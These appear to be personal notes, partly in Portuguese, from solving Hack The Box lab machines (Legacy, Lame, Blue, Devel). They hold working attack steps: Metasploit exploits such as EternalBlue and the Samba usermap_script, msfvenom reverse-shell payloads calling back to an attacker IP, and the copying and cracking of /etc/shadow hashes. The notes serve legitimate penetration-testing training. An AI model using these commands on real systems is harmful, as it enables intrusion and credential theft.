https://www.hackthebox.eu/

https://help.hackthebox.eu/getting-started/v2-machines

Starting Point

Connect to the VPN via your console
$openvpn /path/to/rubens.ovpn

LEGACY:
nikto - não é web server
nmap -A -T4 -p- 10.10.10.4 ### scan TCP. For UDP: -sU

ACK
SYN ACK
ACK - or RST

Port 139 - 445 - SMB-os related - Windows definitive
message_signing: disabled (dangerous, but default) -> Vulnerability **

Try:
smbclient -L \\10.10.10.4
smbclient -L \\\\10.10.10.4\\$ADMIN 

search smb_version
use auxiliary/scanner/smb/smb_version   -> auxiliary look for, does not attack
set RHOSTS 10.10.10.4
set THREADS 10

Goo Windows XP SP3 exploit

https://www.exploit-db.com
https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi/ -> Makes metasploit

msfconsole
set options

So far no privilege escalation
set payload
run

NT AUTHOrity -> highest
getuid
sysinfo
architecture must match meterpreter shell x86
meterpreter> help
POST -> arp

getsystem -> escalate privileges -> may crash machine
hashdump -> crack passwords -> second hash crackmapexec psexec

> shell
C:\WINDOWS\> cd Documents Settings \  john z Desktop\ type user.txt submit flag
C:\WINDOWS\> cd Documents Settings \ administrator \ Desktop\type root.txt submit flag
pwd
cd c:\\
dir

nmap -A -T4 -p- -Pn 10.10.10.229

SPECTRA

use unix/webapp/php_include

set payload payload/php/bind_php_ipv6

LAME

openvpn ./rubensz.ovpn

scanning:
nmap -A -T5 -p- -Pn 10.10.10.3
-A takes loger, OS, etc
nmap -A -T5 -p21,80 -Pn 10.10.10.3

ver antes as portas**
e depois versões**
distccd v1 ((GNU) 4.2.4
samba.py

Port 21 FTP - ** versions are exploitable - buffer overflow - upload + social engineering to open file
Port 22 SSH - hard - brute force
Port 443

red team quiet

Host script results:
|_clock-skew: mean: 2h08m30s, deviation: 2h49m45s, median: 8m28s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)

smbclient \\\\10.10.10.3\\
smbclient \\\\10.10.10.3\\tmp

we can upload but how to execute ?

try:
smbclient \\\\10.10.10.3\\opt
smbclient \\\\10.10.10.3\\$ADMIN

Host script results:
|_clock-skew: mean: 2h08m30s, deviation: 2h49m45s, median: 8m28s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)

Goo

Samba 3.0.20 Debian exploit
exploit-db
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit) 

systemctl postgresql enable
msfconsole

Rapid7:
msf > use exploit/multi/samba/usermap_script
msf exploit(usermap_script) > show targets
    ...targets...
msf exploit(usermap_script) > set TARGET < target-id >
msf exploit(usermap_script) > show options
msf exploit(usermap_script) > exploit

locate root.txt
locate user.txt

cat /etc/passwd
real users at the bottom

cat /etc-opt/shadow

copy  /etc/passwd
copy  /etc/shadow

unshadow passwd shadow

Goo hash $1$ -- hashcat - His YouTube -- Cracking linux password hashes**

ftp 10.10.10.3
anonymous
anonymous

BLUE
nmap -A -T4 -p- 10.10.10.40
smb
Windows 7 - ethernal blue
active directory pentesting
search ms17-010

use auxiliary/scanner/smb/smb_ms17_010
use exploit/windows/smb/ms17_010_eternalblue
whoami
hostname

set payload windows + TAB 
set payload windows/x64/met + TAB
exploit(windows/smb/ms17_010_eternalblue) > set payload payload/windows/x64/meterpreter/reverse_tcp
shell/reverse_tcp is staged payload
shell_reverse_tcp is unstaged payload
try both

payload => windows/x64/shell_reverse_tcp
payload => windows/x64/shell/reverse_tcp

Goo -> autoblue Github
https://github.com/3ndG4me/AutoBlue-MS17-010

─# ./shell_prep.sh   
                 _.-;;-._
          '-..-'|   ||   |
          '-..-'|_.-;;-._|
          '-..-'|   ||   |
          '-..-'|_.-''-._|   
Eternal Blue Windows Shellcode Compiler

Let's compile them windoos shellcodezzz
Compiling x86 kernel shellcode
kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)
Y
LHOST for reverse connection:
10.10.14.29
LPORT you want x64 to listen on:
4445
LPORT you want x86 to listen on:
4446
Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
1
Type 0 to generate a staged payload or 1 to generate a stageless payload
1

4445
4446
0
0 -> metasploit
./listener_prep.sh
4445
4446
0
0

python eternalblue_exploit7.py 10.10.10.40 ./shellcode/sc_all.bin


-------------------------------------------------------------------------
DEVEL - beautiful

Port 21 ftp -80 http
MS IIS - header
Firefox 10.10.10.5 open

enumerate ->> dirbuster&
http://10.10.10.5
/usr/share/wordlists/...small.txt
Apache is php
asm, asmx, asp, aspx,txt
...

ftp 10.10.10.5
put dog.jpg

msfvenom cheat sheet
https://netsec.ws/?p=331

----- IMPORTANTISSIMO: IP não é 192.168.0.27 mas 10.10.12.28 -------

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.12.28 LPORT=4444 -f aspx > ex.aspx

msfconsole
exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp

ftp put ex.aspx

open browser 10.10.10.5/ex.aspx

sysinfo

getuid

meterpreter > background**

search suggester

** escalate privileges: --------------------------

post(multi/recon/local_exploit_suggester) > set SESSION 1
( se falhar agora vira session 2)

use windows/local/ms10_015_kitrap0d

Perhaps the most beautiful attack so far, on HackTheBox.



A Windows machine with open ports (21, 80) allowing anonymous FTP connections. A meterpreter payload (aspx) was developed and uploaded into FTP directory of the machine, anonymously.



After that, a reverse tcp in multi/handler was opened to listen to the refresh of the website page with the meterpreter payload from FTP.



A shell with user privileges was successfully opened. Then comes privilege escalation:



While the materpreter shell was still open, I only got 40 seconds to use the session and explore a vulnerability to gain root access.



Awesome training.
